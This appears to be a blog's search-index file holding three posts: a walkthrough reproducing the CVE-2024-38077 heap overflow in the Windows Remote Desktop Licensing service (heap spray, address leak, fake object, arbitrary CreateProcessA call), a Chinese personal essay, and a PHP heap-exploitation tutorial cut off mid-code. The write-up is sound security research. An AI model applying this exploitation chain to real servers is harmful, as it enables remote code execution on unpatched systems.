<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2024-38077  Reproduction</title>
      <link href="/2024/11/23/CVE-2024-38077%20(madlicense)%20reproduction/"/>
      <url>/2024/11/23/CVE-2024-38077%20(madlicense)%20reproduction/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Talk is cheap, show me your bomb</p></blockquote><h1 id="1-Vuln-Analyze"><a href="#1-Vuln-Analyze" class="headerlink" title="1. Vuln Analyze"></a>1. Vuln Analyze</h1><h2 id="1-1-Call-Stack"><a href="#1-1-Call-Stack" class="headerlink" title="1.1 Call Stack"></a>1.1 Call Stack</h2><pre><code> # Child-SP          RetAddr               Call Site00 000000b9`d2ffbd30 00007fff`67a76fec     lserver!CDataCoding::DecodeData01 000000b9`d2ffbd70 00007fff`67a5c793     lserver!LKPLiteVerifyLKP+0x3802 000000b9`d2ffbdc0 00007fff`67a343eb     lserver!TLSDBTelephoneRegisterLicenseKeyPack+0x16303 000000b9`d2ffd7d0 00007fff`867052a3     lserver!TLSRpcTelephoneRegisterLKP+0x15b04 000000b9`d2fff0c0 00007fff`8664854d     RPCRT4!Invoke+0x7305 000000b9`d2fff120 00007fff`86647fda     RPCRT4!NdrStubCall2+0x30d06 000000b9`d2fff3d0 00007fff`866b7967     RPCRT4!NdrServerCall2+0x1a</code></pre><h2 id="1-2-Vuln"><a href="#1-2-Vuln" class="headerlink" title="1.2 Vuln"></a>1.2 Vuln</h2><pre><code class="c">__int64 __fastcall CDataCoding::DecodeData(CDataCoding *this, wchar_t *a2, unsigned __int8 **a3, unsigned int *a4)&#123;  unsigned int v4; // edi  int v8; // ebp  unsigned int v9; // ebx  HANDLE ProcessHeap; // rax  unsigned __int8 *v11; // rax  unsigned __int8 *v12; // rbx  wchar_t *v13; // rax  __int64 v14; // rcx  unsigned __int8 *v15; // rdx  __int64 v16; // r9  unsigned int v17; // ecx  HANDLE v18; // rax  v4 = 0;  v8 = 0;  if ( a3 )  &#123;    v9 = dwBytes; // Always be 21    *a3 = 0LL;    *a4 = 0;    ProcessHeap = GetProcessHeap();    v11 = (unsigned __int8 *)HeapAlloc(ProcessHeap, 8u, v9);   // fixed size    v12 = v11;    if ( v11 )    &#123;      memset_0(v11, 0, (unsigned int)dwBytes);      while ( *a2 )      &#123;        // str: BCDFGHJKMPQRTVWXY2346789 a2: usercontrol        v13 = wcschr_0(Str, *a2);        if ( !v13 )        &#123;          v4 = 13;          v18 = GetProcessHeap();          HeapFree(v18, 0, v12);          return v4;        &#125;        // a2 from base24 to base 10        v14 = v13 - Str;        v15 = v12;        v16 = (unsigned int)(v8 + 1);        do        &#123;          v17 = dword_1800D61C8 * *v15 + v14;          *v15++ = v17;          LODWORD(v14) = v17 &gt;&gt; 8;          --v16;        &#125;        while ( v16 );        if ( (_DWORD)v14 )          v12[++v8] = v14; // move base10 to buffer        ++a2;      &#125;      *a4 = dwBytes;      *a3 = v12;    &#125;    else    &#123;      return 8;    &#125;  &#125;  else  &#123;    return 87;  &#125;  return v4;&#125;</code></pre><p>Heap overflow without restriction</p><h2 id="1-3-Vuln-Component"><a href="#1-3-Vuln-Component" class="headerlink" title="1.3 Vuln Component"></a>1.3 Vuln Component</h2><p>lserver.dll loaded by svchost.exe</p><p><code>TLSRpcTelephoneRegisterLKP()</code> function</p><h1 id="2-Heap-Manage-Mechanism"><a href="#2-Heap-Manage-Mechanism" class="headerlink" title="2. Heap Manage Mechanism"></a>2. Heap Manage Mechanism</h1><p>It used segment heap</p><p>We mainly foucus on LFH since its vulnerable</p><ul><li>headless</li><li>randomly allocated</li></ul><h1 id="3-Exploitation"><a href="#3-Exploitation" class="headerlink" title="3. Exploitation"></a>3. Exploitation</h1><h2 id="3-1-Enable-LFH"><a href="#3-1-Enable-LFH" class="headerlink" title="3.1 Enable LFH"></a>3.1 Enable LFH</h2><blockquote><p>Bucket activation occurs if there are <strong>17 active allocations</strong> for the bucket’s allocation size.</p><p>Bucket activation also occurs if there are <strong>2,040 allocation requests</strong> for the bucket’s allocation size.</p></blockquote><p>Here we allocate 2,040 chunks with size 0x20 to enable LFH.</p><p><code>TLSRpcRegisterLicenseKeyPack()</code> takes in encrypted payload and allocate memory for the payload after decryption. So we can allocate arbitary memory with it.</p><p>Here we use <code>TLSRpcRegisterLicenseKeyPack()</code> to spray 0x20 chunks.</p><h2 id="3-2-Leak-Address"><a href="#3-2-Leak-Address" class="headerlink" title="3.2 Leak Address"></a>3.2 Leak Address</h2><p>The widely used <code>lpContext</code> structure is allocated in each <code>TLSRpcConnect()</code> and returned as a handle.</p><pre><code class="c">typedef struct __ClientContext &#123;    LPTSTR  m_Client;    long    m_RefCount;    DWORD   m_ClientFlags;    DWORD   m_LastError;    CONTEXTHANDLE_TYPE m_ContextType;    HANDLE  m_ContextHandle;    // NEEDED - A list to store all memory/handle    //          allocated for the client&#125; CLIENTCONTEXT, *LPCLIENTCONTEXT;</code></pre><p>And its <strong>0x20</strong> large, which means it will be allocated in the same bucket with our vulnerable buffer.</p><p>Thus we can srpay handles with <code>TLSRpcConnect()</code>, free some handles, and then allocate vulnerable buffer with <code>TLSRpcTelephoneRegisterLKP()</code>. We will easily overflow to the <code>lpcontext</code> structure. And the pointers in the structure is potential.</p><p><code>TLSRpcRetrieveTermServCert()</code> takes the lpcontext as argument, and</p><pre><code class="c">SAFESTRCPY(LicenseRequest.szMachineName, lpContext-&gt;m_Client);SAFESTRCPY(LicenseRequest.szUserName, lpContext-&gt;m_Client);</code></pre><p>Finally, it returns the <code>ppbCert</code> containing the <code>LicenseRequest</code></p><p>Since <code>lpContext-&gt;m_Clinet</code> is easy to forge, we get an AAR.</p><h2 id="3-3-Hijack-rip"><a href="#3-3-Hijack-rip" class="headerlink" title="3.3 Hijack rip"></a>3.3 Hijack rip</h2><h3 id="3-3-1-Hijack-Controlflow"><a href="#3-3-1-Hijack-Controlflow" class="headerlink" title="3.3.1 Hijack Controlflow"></a>3.3.1 Hijack Controlflow</h3><p><code>TLSRpcKeyPackEnumNext() -&gt; TLSDBLicenseKeyPackEnumNext() -&gt; TLSDBKeyPackEnumNext() -&gt; lpContext-&gt;m_ContextHandle-&gt;pbWorkSpace-&gt;m_LicPackTable.EnumerateNext()</code></p><p>It finally calls a virtual function related to <code>lpContext</code></p><pre><code class="c">error_status_t TLSRpcKeyPackEnumNext(     /* [in] */ PCONTEXT_HANDLE phContext,    /* [ref][out] */ LPLSKeyPack lpKeyPack,    /* [ref][out][in] */ PDWORD dwErrCode    )&#123;    ...    LPENUMHANDLE hEnum=(LPENUMHANDLE)lpContext-&gt;m_ContextHandle;    status=TLSDBLicenseKeyPackEnumNext(                             hEnum,                             lpKeyPack,                            bShowAll                        );    ...&#125;DWORD TLSDBLicenseKeyPackEnumNext(    LPENUMHANDLE lpEnumHandle,     LPLSKeyPack lpLsKeyPack,    BOOL bShowAll    )&#123;    ...    switch(lpEnumHandle-&gt;chFetchState)    &#123;        case ENUMHANDLE::FETCH_NEXT_KEYPACK:            dwStatus=TLSDBKeyPackEnumNext(                                lpEnumHandle-&gt;pbWorkSpace,                                 &amp;lpEnumHandle-&gt;CurrentKeyPack                            );    ...&#125;DWORDTLSDBKeyPackEnumNext(     IN PTLSDbWorkSpace pDbWkSpace,     IN OUT PTLSLICENSEPACK lpKeyPack    )&#123;    ...    LicPackTable&amp; licpackTable=pDbWkSpace-&gt;m_LicPackTable;    switch(licpackTable.EnumerateNext(*lpKeyPack))    ...&#125;</code></pre><p>So in the <code>TLSDBKeyPackEnumNext</code>, we can control the overflow to</p><pre><code class="c">lpContext-&gt;m_ContextHandle-&gt;pbWorkSpace-&gt;m_LicPackTable.EnumerateNext()</code></pre><p>In disassembly:</p><pre><code class="c">__int64 __fastcall TLSDBKeyPackEnumNext(__int64 *a1, void *a2)&#123;  if ( a1 &amp;&amp; a2 )  &#123;    (*(void (__fastcall **)(__int64 *, void *, _QWORD, _QWORD))(*a1 + 0x70))(a1, a2, 0LL, 0LL);    v3 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 0x1F0))(a1);    ...</code></pre><h3 id="3-3-2-Leak-Fake-Object-Address"><a href="#3-3-2-Leak-Fake-Object-Address" class="headerlink" title="3.3.2 Leak Fake Object Address"></a>3.3.2 Leak Fake Object Address</h3><p>Since we need to forge the function pointer, we need to forge the whole <code>m_ContextHandle</code>. Then we must obtain our <strong>fake obj address</strong> because it contains some layers of pointers.</p><p>Review our segment heap mechenism. We learn that LFH and VS are allocated from the Backend Allocator, and Luckily, the <code>_SEGMENT_HEAP</code> contains the information of the last block of current backend heap.</p><p>Now that we have AAR primitive, we can obtain the last block address, and blocks are allocated continuously. So we will spray our fakeobj, and we can predict an address before that.</p><p><img src="/%E6%97%A0%E6%A0%87%E9%A2%98-2024-10-12-1007%201.png"></p><h3 id="3-3-3-Construct-Fake-Object"><a href="#3-3-3-Construct-Fake-Object" class="headerlink" title="3.3.3 Construct Fake Object"></a>3.3.3 Construct Fake Object</h3><p>Now we have fakeobj address. Just forge the object with its defination</p><pre><code class="c">//lpContext-&gt;m_ContextHandletypedef struct __ENUMHANDLE &#123;    typedef enum &#123;        FETCH_NEXT_KEYPACK=1,        FETCH_NEXT_KEYPACKDESC,        FETCH_NEW_KEYPACKDESC    &#125; ENUM_FETCH_CODE;    PTLSDbWorkSpace pbWorkSpace;    TLSLICENSEPACK  CurrentKeyPack;    LICPACKDESC     KPDescSearchValue;    DWORD           dwKPDescSearchParm;    BOOL            bKPDescMatchAll;    CHAR            chFetchState;&#125; ENUMHANDLE, *LPENUMHANDLE;//lpContext-&gt;m_ContextHandle-&gt;pbWorkSpacetypedef struct __TlsDbWorkSpace &#123;    static JBInstance g_JbInstance;    JBSession  m_JetSession;    JBDatabase m_JetDatabase;    LicPackTable            m_LicPackTable; // Target    LicensedTable           m_LicensedTable;    ...&#125; TLSDbWorkSpace, *LPTLSDbWorkSpace, *PTLSDbWorkSpace;</code></pre><p><img src="/Pasted%20image%2020241012102221%201.png"></p><h2 id="3-4-Hijack-Arguments"><a href="#3-4-Hijack-Arguments" class="headerlink" title="3.4 Hijack Arguments"></a>3.4 Hijack Arguments</h2><p>As the graph indicates above, the rcx is a pointer to the <code>pbWorkSpace</code>, which is unuseable in most of the cases. Because its first element must be <code>*m_LicPackTable</code>.</p><p>Then we look into the magical <code>NdrServerCall2()</code>. It receives a pointer to structure <code>RpcMsg</code> as the only argument, and finally calls the structure related pointer with structure related argument list (though rather complicated).</p><p><code>NdrServerCall2() -&gt; NdrStubCall2() -&gt; ... -&gt; Invoke()</code></p><p>Anyway, the function is so f complicated. It does so many things to parse <code>RpcMsg</code>, most parts can be easily(?) bypassed by constructing structures.</p><p>The hardest part is that they deliver the attributes of arguments in a certain formated string. After reversing, I made a template for better use.</p><pre><code class="python">    pbWorkSpace += b&quot;\x32\x48&quot;    pbWorkSpace += b&quot;\x00\x00\x00\x00&quot;    pbWorkSpace += b&quot;\x00\x00&quot; #procNum    pbWorkSpace += p16(argnum * 8) #stacksize    # pbWorkSpace += b&quot;\x30\xe0\x00\x00\x00\x00&quot;    # NdrInfo.pProcDesc    pbWorkSpace += b&quot;\xc0\x00\x10\x00&quot; #ClientBufferSize &amp; ServerBufferSize    pbWorkSpace += b&quot;\x40&quot; #Oi2Flags    pbWorkSpace += p8(argnum * 2) #NumberParams    # NdrExts    pbWorkSpace += b&quot;\x0a&quot; #Size    pbWorkSpace += b&quot;\x01\x00\x00&quot; #Flags2 &amp; ClientCorrHint &amp; ServerCorrHint    pbWorkSpace += b&quot;\x00\x00\x00\x00&quot; #NotifyIndex    pbWorkSpace += b&quot;\x00\x00&quot;    # Params    for i in range(argnum * 2):        pbWorkSpace += p16(0x48)        pbWorkSpace += p16(i * 4)        pbWorkSpace += p16(0x09)</code></pre><p>Finally, we get an arbitary call with aribitary arguments (though the fakeobj looks scary).</p><h2 id="3-5-After-Arbitary-Call"><a href="#3-5-After-Arbitary-Call" class="headerlink" title="3.5 After Arbitary Call"></a>3.5 After Arbitary Call</h2><p>Now we have one <strong>arbitary call</strong>, and then crash.</p><p>Because of <strong>CFG(Control Flow Guard)</strong>, we are not able to do ROP or shellcode.</p><p>The method from the origin author is using <code>LoadLibraryA()</code> to load an evil dll from remote smb server. But as a low priviledge user, I found it forbiddend to load dll into svchost.exe from remote smb, though loading from local is possible.</p><p>Then I turned into <code>CreatProcessA()</code>, similar to <code>Winexec()</code>. We can execute cmd command now.</p><p>Notice:</p><ul><li><code>CreatProcessA()</code> is NOT equal to cmd. Only one command is allowed, that means ‘&amp;&amp;’, ‘&amp;’, ‘|’ are not allowed. So we have to use <code>cmd.exe /C &quot;xxx&quot;</code> to execute multipule command at a time.</li><li><code>cmd.exe /C &quot;xxx&quot;</code> only allows <strong>double quotation marks</strong></li><li>I failed to load <code>powershell.exe</code>, maybe related to some policy</li></ul><h1 id="4-References"><a href="#4-References" class="headerlink" title="4. References"></a>4. References</h1><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38077">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38077</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 在逃离之后</title>
      <link href="/2024/01/01/2023-%E5%9C%A8%E9%80%83%E7%A6%BB%E4%B9%8B%E5%90%8E/"/>
      <url>/2024/01/01/2023-%E5%9C%A8%E9%80%83%E7%A6%BB%E4%B9%8B%E5%90%8E/</url>
      
        <content type="html"><![CDATA[<p>熬过了艰难的期末，终于有点精力写些想表达的东西。这种感觉一如高考完的那个暑假里，在迷茫中写写划划，企图在文字中找到一种力量感。之后的一年，过得像中学墙上的模范议论文，填满了字，读不出意思。即使在人生走马灯里，也是被”a few years later”一笔带过的水平。当然，好的故事总要学会在不该精彩的地方不精彩。正好前年的故事也忘讲了，那就从头讲起吧。</p><p>高考完的日子，一拨人忙着缅怀，一拨人忙着逃离。我理应也忙着逃离。但忍不住给喜欢的女生发了条消息，顺理成章地，让本就不太一帆风顺的逃离之旅雪上加霜。在得手之前，在逃离之后，我在十八岁生日那天一遍遍梳理着自己既不岁月静好也不波澜壮阔的前半生。人总是在日复一日里渴望遇见改变，直到意识到改变永远不会奔他而来，这时候的他，浑然不觉已经在等待着一声发令——一个意义非凡的日子、一句话、一个人。那天我真正决定要逃离，我知道我的一部分还困在那里。它不在学校里面，而在沿着地基往下五千万公里深处。那里有一条根，贯穿我受教育的前半生，蔓延，生长，在生命的终点朝我挥手。</p><p>我又想到大一。大一的关键词是“悬浮”。那是什么感觉，就像一阵风托起，你和周遭世界就浮到了半空中。你的力量，在这个没有支点的空中轻飘飘的，稍不注意还会失去平衡。于是你和周围的人一起飘啊飘。混沌运动里没有人知道目的地。</p><p>在这个读研几乎成为唯一出路的专业，追求极致的分数是生存的本能。我看到一些优秀的同学为了考试奉献了自己大部分时间，然后公开或私下用“卷”评价着其他努力的同学，转头又在某些交流群里以“X神”“X佬”互相吹捧。我无意指谪，选择这种活法的是环境，而非他们。但从小到大看同样的剧本多少会审美疲劳，何况叛逆如我。于是我开始翘课，起初只翘C语言一类的水课，然后开始间歇翘微积分一类的正课，直到发现进度跟不上，索性一节都不去了。好在考前力挽狂澜，最后杂技般安稳地落在保研线里。<br>翘出来的时间也未必干了什么正事，除了睡觉，顺利完成的只记得通过凝聚招新。剩下的都是些荒唐的失败：挑战一人完成电赛题目（然后在截稿前发现pcb封装画反）、挑战同一天打校内acm和台球校赛、挑战读完图书馆里各种稀奇古怪的领域的代表作品。不带来收获的失败，甚至有些乏味。乏味当然是相对的，一直输也比不上场好。</p><p>后面就是以前提过的老剧情，观摩ASC，参加国赛，重新融入凝聚balabala。最重要的，大概是找到了热爱的方向和一群志同道合的人。</p><p>这是正面的影响，从负面来说，一个明确的方向，让我对课内更不上心了。据统计，我23下半年中后期一周平均只上了2.5节课，又已知我在复习期间相当浮躁（且沉迷R6），易得：我的绩点将惨不忍睹。（本文动笔时，我一度相信半导体物理将迎来我的第一门挂科。由于本文跨越一个多月才完成，写到本段时成绩早就出了，我现在知道我被捞了，有道是：天无绝人之路）这种成绩基本宣告和保研无缘了。</p><p>这个结果并没有引起我多少触动，好像早就知道会走到这一步。我想，即使让时间倒流两个月，提前开始复习，我依旧会在能感知到危险的那个节点之前挥霍时间，最后依旧是勉勉强强复习个大概的结果。如果我减少翘课次数，我会因为增添的信心，继续延后那个认真复习的节点，最后的结果也不会改变多少。换句话说，复习时间、翘课，这些变量如何改变，也无法改变其结果。考试的结局，在失败这里收敛了。这不是改头换面的宿命论，我对待学科的热情，始终控制着收敛的方向。只要不对关键变量做出改变，再多的尝试和悔恨也没有意义。一切都是我应得的，这样的观点让我轻易就接受了现实。</p><p>这也算逃离吗？从行为上更像被驱逐，看原因却像早有预谋。从一条明确的赛道，走向未知的旷野。好处是不用再付出维持选择权的成本，这大概是一种自由，可是自由将落向何处，我不知道。如果明天的安全感不能托付某个制度、某个组织，那我选择交给明天的自己。</p><p>那年高三，空气阴冷，自习课，班主任来到跟前，我还沉浸在卡拉马佐夫兄弟的世界浑然不觉。我相信那一刻我已经逃离了，透过层层书卷和天花板，享受短暂的祥和。此后的人生，我必须不停逃下去，才能躲过身后的崩坏。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>A Brief Introduction to PHP Heap Exploitation</title>
      <link href="/2023/09/14/php-pwn/"/>
      <url>/2023/09/14/php-pwn/</url>
      
        <content type="html"><![CDATA[<p>It&#96;s my first time encountering this fancy pwn item, known as Web Pwn, on WACON2023. I have few experience on php coding, so it spent me a long time to figure out how ZendMM actually works.</p><h1 id="The-Memory-Management-of-Zend-Engine"><a href="#The-Memory-Management-of-Zend-Engine" class="headerlink" title="The Memory Management of Zend Engine"></a>The Memory Management of Zend Engine</h1><p>PHP codes are explained through the <strong>Zend engine</strong>. Instead of directly using traditional <code>malloc</code> and <code>free</code> to manage memory, Zend uses <strong>ZendMM</strong> to allocate and release memory through <code>emalloc</code> and <code>efree</code> , which efficiently serves PHP request-bound machanisms (that&#96;s another topic). </p><h2 id="Basic-Structure"><a href="#Basic-Structure" class="headerlink" title="Basic Structure"></a>Basic Structure</h2><p>As writen in <code>zend_alloc.c</code> source code, all allocations are split into 3 categories: huge, large and small. Remember that zend_alloc allocates memory form OS by <strong>CHUNKS</strong>, which contains 2MB memories. Huge allocs are those who exceed a chunk. And zend_alloc use  <code>mmap</code> to allocate one. The concept of <strong>PAGE</strong> is commonly used in ZendMM, which usually contains 4KB memories. That&#96;s to say, a chunk contains 512 pages. Small allocs are less than 3&#x2F;4 of page size. The rest are Large allocs.</p><p><img src="https://pic1.xuehuaimg.com/proxy/csdn/https://img-blog.csdnimg.cn/20191230114413519.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyNzgzNzAz,size_16,color_FFFFFF,t_70" alt="img"></p><p>Each time a chunk is alloced, the first page of the chunk is used to record basic information about the chunk. The Structure recording information is <code>_zend_mm_chunk</code> ,(which doesn&#96;t appear in huge chunk)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_chunk</span> &#123;</span></span><br><span class="line">zend_mm_heap      *heap;</span><br><span class="line">zend_mm_chunk     *next;</span><br><span class="line">zend_mm_chunk     *prev;</span><br><span class="line"><span class="type">uint32_t</span>           free_pages;<span class="comment">/* number of free pages */</span></span><br><span class="line"><span class="type">uint32_t</span>           free_tail;               <span class="comment">/* number of free pages at the end of chunk */</span></span><br><span class="line"><span class="type">uint32_t</span>           num;</span><br><span class="line"><span class="type">char</span>               reserve[<span class="number">64</span> - (<span class="keyword">sizeof</span>(<span class="type">void</span>*) * <span class="number">3</span> + <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>) * <span class="number">3</span>)];</span><br><span class="line">zend_mm_heap       heap_slot;               <span class="comment">/* used only in main chunk */</span></span><br><span class="line">zend_mm_page_map   free_map;                <span class="comment">/* 512 bits or 64 bytes */</span></span><br><span class="line">zend_mm_page_info  <span class="built_in">map</span>[ZEND_MM_PAGES];      <span class="comment">/* 2 KB = 512 * 4 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>All the chunks form a double linked list (<code>*next</code>, <code>*prev</code>). A chunk records the usage and other detailed information of its 512 pages through <code>zend_mm_page_map</code>, <code>zend_mm_page_info</code>. Also, the <code>zend_mm_heap</code> structure merits attention.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_heap</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line"><span class="type">int</span>                use_custom_heap;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STORAGE</span></span><br><span class="line">zend_mm_storage   *storage;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="type">size_t</span>             size;                    <span class="comment">/* current memory usage */</span></span><br><span class="line"><span class="type">size_t</span>             peak;                    <span class="comment">/* peak memory usage */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">zend_mm_free_slot *free_slot[ZEND_MM_BINS]; <span class="comment">/* free lists for small sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT || ZEND_MM_LIMIT</span></span><br><span class="line"><span class="type">size_t</span>             real_size;               <span class="comment">/* current size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="type">size_t</span>             real_peak;               <span class="comment">/* peak size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_LIMIT</span></span><br><span class="line"><span class="type">size_t</span>             limit;                   <span class="comment">/* memory limit */</span></span><br><span class="line"><span class="type">int</span>                overflow;                <span class="comment">/* memory overflow flag */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">zend_mm_huge_list *huge_list;               <span class="comment">/* list of huge allocated blocks */</span></span><br><span class="line"></span><br><span class="line">zend_mm_chunk     *main_chunk;</span><br><span class="line">zend_mm_chunk     *cached_chunks;<span class="comment">/* list of unused chunks */</span></span><br><span class="line"><span class="type">int</span>                chunks_count;<span class="comment">/* number of allocated chunks */</span></span><br><span class="line"><span class="type">int</span>                peak_chunks_count;<span class="comment">/* peak number of allocated chunks for current request */</span></span><br><span class="line"><span class="type">int</span>                cached_chunks_count;<span class="comment">/* number of cached chunks */</span></span><br><span class="line"><span class="type">double</span>             avg_chunks_count;<span class="comment">/* average number of chunks allocated per request */</span></span><br><span class="line"><span class="type">int</span>                last_chunks_delete_boundary; <span class="comment">/* number of chunks after last deletion */</span></span><br><span class="line"><span class="type">int</span>                last_chunks_delete_count;    <span class="comment">/* number of deletion over the last boundary */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span>);</span><br><span class="line"><span class="type">void</span>       (*_free)(<span class="type">void</span>*);</span><br><span class="line"><span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">&#125; <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span> ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line"><span class="type">void</span>       (*_free)(<span class="type">void</span>*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line"><span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">&#125; debug;</span><br><span class="line">&#125; custom_heap;</span><br><span class="line">HashTable *tracked_allocs;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Mind the <code>zend_mm_free_slot</code>. The <code>ZEND_MM_BINS</code> usually is 30, which means there are 30 fixed size for small runs. As a result, there are 30 single linked list.</p><h2 id="Vulnerable-Small-Runs"><a href="#Vulnerable-Small-Runs" class="headerlink" title="Vulnerable Small Runs"></a>Vulnerable Small Runs</h2><p>We mainly focus on small runs, because its vulnerable.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_never_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small_slow</span><span class="params">(zend_mm_heap *heap, <span class="type">uint32_t</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">omitted...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line">chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);</span><br><span class="line">page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;</span><br><span class="line">chunk-&gt;<span class="built_in">map</span>[page_num] = ZEND_MM_SRUN(bin_num);</span><br><span class="line"><span class="keyword">if</span> (bin_pages[bin_num] &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="type">uint32_t</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">chunk-&gt;<span class="built_in">map</span>[page_num+i] = ZEND_MM_NRUN(bin_num, i);</span><br><span class="line">i++;</span><br><span class="line">&#125; <span class="keyword">while</span> (i &lt; bin_pages[bin_num]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a linked list of elements from 1 to last */</span></span><br><span class="line">end = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - <span class="number">1</span>)));</span><br><span class="line">heap-&gt;free_slot[bin_num] = p = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + bin_data_size[bin_num]);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">p-&gt;next_free_slot = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span 